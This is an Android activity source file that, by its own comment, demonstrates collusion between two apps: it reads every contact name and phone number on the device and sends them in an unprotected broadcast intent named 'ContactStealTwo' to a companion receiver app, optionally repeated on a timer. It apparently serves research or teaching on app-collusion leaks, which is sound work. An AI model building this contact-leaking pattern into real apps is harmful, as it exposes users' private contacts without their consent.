package com.android.acid.Reader;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

/*
 * This class demonstrates the collusion between two applications that exchange the
 * contacts using a broadcast, this class will send the contacts to the ConReceiver
 * Application
 */
public class MainActivity extends Activity {

    private static final int MY_PERMISSIONS_REQUEST_READ_CONTACTS = 0;

    // This list contains all the contacts
    ListView contactList;

    // This is the layout for the application
    LinearLayout mainLayout;

    // This is a button to click when sending contacts once
    Button singleSendButton;

    // This is a button to click when sending contacts multiple times
    Button multipleSendButton;

    // This is an edit to display messages
    EditText editLog;

    // This is an edit box to enter the number of sends for a multiple send
    EditText sendCountEdit;

    // This is an edit box to enter the interval between sends in a multiple send
    EditText intervalEdit;

    // This String is used to prevent duplicate contacts in the application
    String tempContact = "temp";

    /*
     * The system will call this method when we create the activity. In this, we initialise the
     * essential components of this activity. In this method, we call setContentView() which
     * defines the layout for the activity's UI (The XML file).
     */
    @Override
    protected void onCreate(Bundle savedInstanceState) {
    	/*
    	 * If the user has the app opens and closes it to the task bar, this restores
    	 * it's previous state
    	 */
        super.onCreate(savedInstanceState);
        // Defines the layout of this activity
        setContentView(R.layout.activity_main);

        mainLayout = (LinearLayout) findViewById(R.id.MainLayout);
        editLog = (EditText) findViewById(R.id.editLog);
        contactList = (ListView) findViewById(R.id.ContactList);
        sendCountEdit = (EditText) findViewById(R.id.editSendCount);
        intervalEdit = (EditText) findViewById(R.id.editInterval);
        singleSendButton = (Button) findViewById(R.id.buttonSingleSend);
        multipleSendButton = (Button) findViewById(R.id.buttonMultipleSend);

        // Sets ArrayAdapter to the contact list ListView, this then displays the contacts
        ArrayAdapter<String> adapter = new ArrayAdapter<String>(
                getApplicationContext(), R.layout.contact_text, getContacts());
        contactList.setAdapter(adapter);

        editLog.setOnClickListener(new View.OnClickListener()
        {
           public void onClick(View v)
           {
               editLog.setText("");
           }
        });

        singleSendButton.setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View v)
            {
                WriteLog("Sending contacts");

                SingleSend();

                WriteLog("Send complete");
            }
        });

        multipleSendButton.setOnClickListener(new View.OnClickListener()
        {
            public void onClick(View v)
            {
                int count = Integer.parseInt(sendCountEdit.getText().toString());
                int interval = Integer.parseInt(intervalEdit.getText().toString());

                WriteLog("Sending contacts");

                for (int n = 0; n < count; n++) {
                    try {
                        SingleSend();
                        Thread.sleep(interval);
                    }
                    catch (InterruptedException e) {
                        WriteLog(e.getMessage());
                    }
                }

                WriteLog("Send complete");
            }
        });
    }

    private void SingleSend() {
        // Create the intent
        Intent intent = new Intent("ContactStealTwo");

        // Adds an extra to the intent, in this case an ArrayList
        ArrayList<String> contacts = getContacts();
        intent.putExtra("array", contacts);

        for (String contact : intent.getStringArrayListExtra("array")) {
            WriteLog(contact);
        }
        WriteLog("");

        // Broadcasts this intent
        sendBroadcast(intent);
    }

    /**
     * This method will retrieve the contacts from the device.
     */
    private ArrayList<String> getContacts() {
        tempContact = "";

        // An ArrayList to store the contacts
        ArrayList<String> contactDetails = new ArrayList<String>();

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED)
        {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_CONTACTS},
                    MY_PERMISSIONS_REQUEST_READ_CONTACTS);
        }

        //This is used to point to the data we need in the CommonDataKinds.Phone.CONTENT_URI
        Cursor cur = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                null,
                null,
                null);

        while (cur.moveToNext()) {

            // Gets the name of the contact
            String conName = cur.getString(
                    cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));

            // Gets the phone number
            String conNumber = cur.getString(
                    cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

            //If the name appeared previously, then this won't put the name on the list
            if (!tempContact.equals(conName)) {
                contactDetails.add(conName + ":\n" + conNumber);
            }

            // Sets a temp contact to prevent duplication
            tempContact = conName;
        }

        // Closes the cursor as we are no longer accessing the contacts
        cur.close();

        return contactDetails;
    }

    private void WriteLog(String message) {
        /*
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("HH:mm:ss.SSS");
        LocalDateTime now = LocalDateTime.now();
        editLog.append(formatter.format(now) + " " + message + "\r\n");
         */

        
    }
}


